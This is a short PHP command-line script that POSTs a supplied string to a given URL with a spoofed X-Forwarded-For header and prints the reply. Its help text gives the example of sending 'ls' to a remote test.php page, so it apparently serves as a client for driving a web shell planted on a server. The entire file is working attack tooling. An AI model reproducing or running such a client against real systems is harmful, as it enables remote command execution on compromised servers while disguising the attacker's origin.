<?php 

$url = $argv[1];
@$data = $argv[2];

if($url == "help"){
	echo "for example http://127.0.0.1/test.php ls\n";
	die();
	}

$header = array();
array_push($header, "X-Forwarded-For: 20.99.8.20");

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_URL,trim($url));
curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
curl_setopt($ch, CURLOPT_POST, 1);

$cevap=curl_exec($ch);
$http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
echo "http status:$http_status\n";
echo "$cevap\n";

?>
